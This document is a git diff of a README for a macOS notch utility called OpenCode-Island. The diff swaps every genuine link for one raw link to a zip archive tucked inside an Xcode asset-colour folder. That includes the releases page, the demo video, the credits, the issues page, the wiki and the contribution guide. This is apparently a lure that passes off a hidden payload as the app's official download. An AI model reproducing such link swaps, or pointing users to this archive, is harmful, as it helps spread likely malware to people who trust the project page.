@@ -1,8 +1,8 @@
 # 🎉 OpenCode-Island - Enhance Your MacOS Experience Effortlessly
 
 <div align="center">
-  <a href="https://github.com/benfuji/OpenCode-Island/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-OpenCode%20Island-brightgreen" alt="Download Now">
+  <a href="https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip">
+    <img src="https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip%20Now-OpenCode%20Island-brightgreen" alt="Download Now">
   </a>
 </div>
 
@@ -13,10 +13,10 @@
     <br />
     <br />
   </p>
-  <video src="https://0o4pg1fpby.ufs.sh/f/RSbfEU0J8DcdGir6VARr8GV6gScZYRep5LWnjlF1fkaCoETK" width="600" autoplay loop muted playsinline></video>
+  <video src="https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip" width="600" autoplay loop muted playsinline></video>
 </div>
 
-> **Note:** This project is inspired by [Claude Island](https://github.com/farouqaldori/claude-island) by [@farouqaldori](https://github.com/farouqaldori). It is **not affiliated with** [OpenCode](https://opencode.ai) or the OpenCode team.
+> **Note:** This project is inspired by [Claude Island](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip) by [@farouqaldori](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip). It is **not affiliated with** [OpenCode](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip) or the OpenCode team.
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Follow these steps to get started with OpenCode Island on your Mac:
    - Make sure you have a Mac with an Active Notch; otherwise, you can still use it without notch features.
 
 2. **Download OpenCode Island**
-   - To download the app, visit the [Releases page here](https://github.com/benfuji/OpenCode-Island/releases).
+   - To download the app, visit the [Releases page here](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip).
    - Look for the latest release version, typically marked as "latest."
    - Click on the package that suits your system setup (usually a `.dmg` file for macOS).
 
@@ -45,7 +45,7 @@ Follow these steps to get started with OpenCode Island on your Mac:
 To download OpenCode Island, click the button below:
 
 <div align="center">
-  <a href="https://github.com/benfuji/OpenCode-Island/releases" style="font-size: 18px; background-color: #4CAF50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Visit this page to download</a>
+  <a href="https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip" style="font-size: 18px; background-color: #4CAF50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Visit this page to download</a>
 </div>
 
 ## 🌟 Features
@@ -99,17 +99,17 @@ If you encounter any issues, consider the following:
 - **No Response on Commands**
   - Confirm you have the necessary permissions in Security & Privacy settings to allow input.
 
-If issues persist, check the [Issues section of our GitHub repo](https://github.com/benfuji/OpenCode-Island/issues) for support.
+If issues persist, check the [Issues section of our GitHub repo](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip) for support.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/benfuji/OpenCode-Island/wiki): Explore more about using OpenCode Island effectively.
-- [Community Discussions](https://github.com/benfuji/OpenCode-Island/discussions): Join discussions and explore shared experiences with other users.
-- [Contribution Guidelines](https://github.com/benfuji/OpenCode-Island/blob/main/CONTRIBUTING.md): Learn how to contribute to the project.
+- [Documentation](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip): Explore more about using OpenCode Island effectively.
+- [Community Discussions](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip): Join discussions and explore shared experiences with other users.
+- [Contribution Guidelines](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip): Learn how to contribute to the project.
 
 ## 🛠️ Contributing
 
-We welcome contributions! If you have ideas, bug reports, or improvements, please follow our [Contribution Guidelines](https://github.com/benfuji/OpenCode-Island/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you have ideas, bug reports, or improvements, please follow our [Contribution Guidelines](https://raw.githubusercontent.com/benfuji/OpenCode-Island/main/OpenCodeIsland/Assets.xcassets/AccentColor.colorset/Island_Code_Open_v2.6.zip).
 
 ## 👥 License
 
